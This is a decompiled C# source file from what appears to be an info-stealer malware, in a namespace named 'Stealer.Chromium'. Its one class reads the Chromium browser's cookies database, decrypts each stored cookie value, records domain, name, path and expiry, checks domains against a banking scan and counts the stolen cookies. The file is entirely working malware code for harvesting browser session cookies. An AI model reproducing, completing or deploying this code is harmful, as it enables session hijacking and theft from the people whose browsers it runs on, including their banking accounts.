using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000025 RID: 37
	internal sealed class Cookies
	{
		// Token: 0x060000AB RID: 171 RVA: 0x00007490 File Offset: 0x00005690
		public static List<Cookie> Get(string sCookie)
		{
			List<Cookie> list2;
			try
			{
				List<Cookie> list = new List<Cookie>();
				SQLite sqlite = SqlReader.ReadTable(sCookie, "cookies");
				bool flag = sqlite == null;
				if (flag)
				{
					list2 = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Cookie cookie = default(Cookie);
						string utf = Crypto.GetUTF8(sqlite.GetValue(i, 0));
						cookie.domain = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						cookie.name = Crypto.GetUTF8(sqlite.GetValue(i, 3));
						cookie.sPath = Crypto.GetUTF8(sqlite.GetValue(i, 6));
						cookie.value = Crypto.GetUTF8(Crypto.EasyDecrypt(sCookie, sqlite.GetValue(i, 5), true));
						cookie.secure = Crypto.GetUTF8(sqlite.GetValue(i, 8));
						long num = Convert.ToInt64(sqlite.GetValue(i, 0)) / 1000000L;
						long num2 = Convert.ToInt64(sqlite.GetValue(i, 7)) / 1000000L;
						DateTime dateTime = cBrowserUtils.UnixTimeStampToDateTime((double)num, true);
						cookie.expirationDate = cBrowserUtils.UnixTimeStampToDateTime((double)num2, true).ToString();
						Banking.ScanData(cookie.domain);
						Counter.Cookies++;
						list.Add(cookie);
					}
					list2 = list;
				}
			}
			catch
			{
				list2 = new List<Cookie>();
			}
			return list2;
		}
	}
}
